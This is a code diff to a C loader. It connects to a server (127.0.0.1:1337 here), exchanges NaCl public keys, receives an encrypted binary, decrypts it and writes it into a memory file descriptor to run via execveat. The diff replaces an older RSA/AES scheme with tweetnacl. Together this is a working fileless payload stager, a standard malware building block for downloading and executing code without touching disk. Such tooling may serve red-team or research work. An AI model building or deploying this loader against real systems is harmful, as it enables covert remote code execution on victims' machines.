@@ -7,10 +7,10 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
-// #include <openssl/aes.h>
-// #include <openssl/rsa.h>
+#include <linux/random.h>
 
 #include "execveat.h"
+#include "tweetnacl.h"
 
 // #define DEBUG
 
@@ -24,38 +24,45 @@
 #endif
 
 
-// static int custom_memfd_create(void)
-// {
-//     return syscall(__NR_memfd_create, "", (unsigned int)(MFD_CLOEXEC));
-// }
+// Patch to allow tweetnacl to work with dietlibc
+void randombytes(uint8_t *buf, uint64_t buf_len)
+{
+    getrandom(buf, buf_len, 0);
+}
 
 
-static int write_with_len(int s, uint8_t *buf, size_t buf_len)
+static int s_write(int s, uint8_t *buf, size_t buf_len)
+{
+    ssize_t write_result = write(s, buf, buf_len); // TODO implement if write_result > 0 but less than len, but should be fine for now
+    if (write_result != buf_len)
+    {
+        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, buf_len));
+    }
+    return write_result;
+}
+
+
+/* UNUSED
+static int s_write_with_len(int s, uint8_t *buf, size_t buf_len)
 {
     uint32_t buf_len_u = buf_len;
     ssize_t buf_with_len_len = sizeof(buf_len_u) + buf_len;
     uint8_t *buf_with_len = malloc(buf_with_len_len);
     memcpy(buf_with_len, &buf_len_u, sizeof(buf_len_u));
     memcpy(buf_with_len + sizeof(buf_len_u), buf, buf_len);
-
-    ssize_t write_result = write(s, buf_with_len, buf_with_len_len); // TODO implement if write_result > 0 but less than len, but should be fine for now
-    if (write_result != buf_with_len_len)
-    {
-        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, buf_with_len_len));
-        return 1;
-    }
-
-    return 0;
+    return s_write(s, buf_with_len, buf_with_len_len);
 }
+*/
 
 
-static uint8_t* read_with_len(int s, ssize_t len)
+static int s_read_with_len_allocated(int s, ssize_t len, uint8_t *buf)
 {
-    uint8_t *read_buf = malloc(len);
+    D(printf("s_read_with_len_allocated() %li\n", len));
+
     ssize_t num_read = 0;
     while (num_read < len)
     {
-        ssize_t read_result = read(s, read_buf + num_read, len - num_read);
+        ssize_t read_result = read(s, buf + num_read, len - num_read);
         if (read_result <= 0)
         {
             break;
@@ -66,13 +73,24 @@ static uint8_t* read_with_len(int s, ssize_t len)
     if (num_read != len)
     {
         D(printf("[line %i] read() failed: %li != %lu\n", __LINE__, num_read, len));
-        return NULL;
     }
-    return read_buf;
+    return num_read;
 }
 
 
-static uint8_t* read_unknown_len(int s, ssize_t *num_read_on_success)
+static uint8_t* s_read_with_len(int s, ssize_t len)
+{
+    uint8_t *buf = malloc(len);
+    if (s_read_with_len_allocated(s, len, buf) != len)
+    {
+        return NULL;
+    }
+    return buf;
+}
+
+
+/* UNUSED
+static uint8_t* s_read_unknown_len(int s, ssize_t *num_read_on_success)
 {
     uint32_t len = 0;
     ssize_t read_result = read(s, &len, sizeof(len));
@@ -83,32 +101,19 @@ static uint8_t* read_unknown_len(int s, ssize_t *num_read_on_success)
     }
 
     D(printf("num_read: %u\n", len));
-    uint8_t *ret = read_with_len(s, len);
+    uint8_t *ret = s_read_with_len(s, len);
     if (ret != NULL && num_read_on_success != NULL)
     {
         *num_read_on_success = len;
     }
     return ret;
 }
-
-
-/*
-static int aes_cbc_decrypt(uint8_t *aes_key_buf, uint8_t *iv, uint8_t *buf, ssize_t buf_len)
-{
-    if (buf_len % 16 != 0)
-    {
-        D(printf("buf_len (%li) must be a multiple of block size\n", buf_len));
-        return -1;
-    }
-    AES_KEY aes_key_expanded;
-    AES_set_decrypt_key(aes_key_buf, 256, &aes_key_expanded);
-    AES_cbc_encrypt(buf, buf, buf_len, &aes_key_expanded, iv, 0);
-}
 */
 
 
 static int download(int fd)
 {
+    // Setup socket
     int s = socket(AF_INET, SOCK_STREAM, 0);
     struct timeval timeout;
     timeout.tv_sec = 1000; // after CONNECT_TIMEOUT seconds connect() will timeout
@@ -116,13 +121,13 @@ static int download(int fd)
     setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
     int syn_retries = 1;
     setsockopt(s, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof(syn_retries));
-
     struct sockaddr_in server_addr = {
         .sin_addr.s_addr = inet_addr("127.0.0.1"),
         .sin_family = AF_INET,
         .sin_port = htons(1337),
     };
 
+    // Connect
     int connect_result = connect(s, (struct sockaddr *)&server_addr, sizeof(server_addr));
     if (connect_result != 0)
     {
@@ -131,91 +136,62 @@ static int download(int fd)
         return 1;
     }
 
-    // TEMP_CODE
-    ssize_t binary_buf_len = 0;
-    uint8_t *binary_buf = read_unknown_len(s, &binary_buf_len);
-    if (binary_buf == NULL)
+
+    // Crypto based of this: https://nacl.cr.yp.to/box.html
+
+    // Generate keypair and send public to server
+    uint8_t pk_alice[crypto_box_PUBLICKEYBYTES];
+    uint8_t sk_alice[crypto_box_SECRETKEYBYTES];
+    crypto_box_keypair(pk_alice, sk_alice);
+    s_write(s, pk_alice, sizeof(pk_alice));
+
+    // Read server's public key and nonce
+    uint8_t *pk_bob = s_read_with_len(s, crypto_box_PUBLICKEYBYTES);
+    uint8_t *nonce_buf = s_read_with_len(s, crypto_box_NONCEBYTES);
+
+    // Read the ciphertext
+    uint32_t ct_buf_len = 0;
+    s_read_with_len_allocated(s, 4, (uint8_t *)&ct_buf_len);
+    ct_buf_len = ct_buf_len + crypto_box_BOXZEROBYTES; // PyNACL trims the first crypto_box_BOXZEROBYTES bytes
+    uint8_t *ct_buf = malloc(ct_buf_len);
+    for (int i = 0; i < crypto_box_BOXZEROBYTES; i++)
     {
-        D(printf("Error reading binary_buf\n"));
-        close(s);
-        return 1;
+        ct_buf[i] = 0; // zero first crypto_box_BOXZEROBYTES bytes
+    }
+    uint32_t ct_buf_len_trimmed = ct_buf_len - crypto_box_BOXZEROBYTES; // PyNACL trims the first crypto_box_BOXZEROBYTES bytes
+    if (s_read_with_len_allocated(s, ct_buf_len_trimmed, ct_buf + crypto_box_BOXZEROBYTES) != ct_buf_len_trimmed)
+    {
+        D(printf("Error reading ct_buf\n"));
+        goto fail;
     }
 
+    // Done comms - close socket
+    close(s);
+
+    // Decrypt
+    uint8_t *pt_buf = malloc(ct_buf_len);
+    if (crypto_box_open(pt_buf, ct_buf, ct_buf_len, nonce_buf, pk_bob, sk_alice) != 0)
+    {
+        D(printf("Error decrypting (crypto_box_open)\n"));
+        goto fail;
+    }
+
+    // Copy to memfd
+    uint8_t *binary_buf = pt_buf + crypto_box_ZEROBYTES;
+    uint32_t binary_buf_len = ct_buf_len - crypto_box_ZEROBYTES;
     ssize_t write_result = write(fd, binary_buf, binary_buf_len);
     if (write_result != binary_buf_len)
     {
-        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, binary_buf_len));
+        D(printf("[line %i] write() failed: %li != %u\n", __LINE__, write_result, binary_buf_len));
         return 1;
     }
 
+    // Success
     return 0;
-    // END TEMP_CODE
 
-    /*
-    RSA *rsa_keys = RSA_generate_key(KEY_LENGTH, PUB_EXP, NULL, NULL);
-    uint8_t *public_key_buf = NULL;
-    int public_key_len = i2d_RSAPublicKey(rsa_keys, &public_key_buf);
-    uint32_t public_key_len_u = (uint32_t)public_key_len;
-
-    D(printf("public_key_len=%i\n", public_key_len));
-
-    if (write_with_len(s, public_key_buf, public_key_len) != 0)
-    {
-        D(printf("write public_key_buf failed\n"));
-        close(s);
-        return 1;
-    }
-
-    uint8_t *aes_key_enc = read_unknown_len(s, NULL);
-    if (aes_key_enc == NULL)
-    {
-        D(printf("read aes_key_enc failed\n"));
-        close(s);
-        return 1;
-    }
-
-    uint8_t *aes_key_buf = malloc(RSA_size(rsa_keys));
-    if(RSA_private_decrypt(RSA_size(rsa_keys), aes_key_enc, aes_key_buf, rsa_keys, RSA_PKCS1_OAEP_PADDING) == -1)
-    {
-        D(printf("Error decrypting with RSA\n"));
-        return 1;
-    }
-
-    uint8_t *iv_buf = read_with_len(s, 16);
-    if (iv_buf == NULL)
-    {
-        D(printf("Error reading iv_buf\n"));
-        close(s);
-        return 1;
-    }
-
-    ssize_t binary_buf_len = 0;
-    uint8_t *binary_buf = read_unknown_len(s, &binary_buf_len);
-    if (binary_buf == NULL)
-    {
-        D(printf("Error reading binary_buf\n"));
-        close(s);
-        return 1;
-    }
-
-    aes_cbc_decrypt(aes_key_buf, iv_buf, binary_buf, binary_buf_len);
-
-    uint8_t padding_len = binary_buf[binary_buf_len-1];
-    binary_buf_len = binary_buf_len - padding_len;
-
-    D(printf("Removed %u padding so binary_buf_len is %li\n", padding_len, binary_buf_len));
-
-    ssize_t write_result = write(fd, binary_buf, binary_buf_len);
-    if (write_result != binary_buf_len)
-    {
-        D(printf("[line %i] write() failed: %li != %lu\n", __LINE__, write_result, binary_buf_len));
-        return 1;
-    }
-
-    D(printf("%s\n", binary_buf));
-    */
-
-    return 0;
+fail:
+    close(s);
+    return 1;
 }
 
 
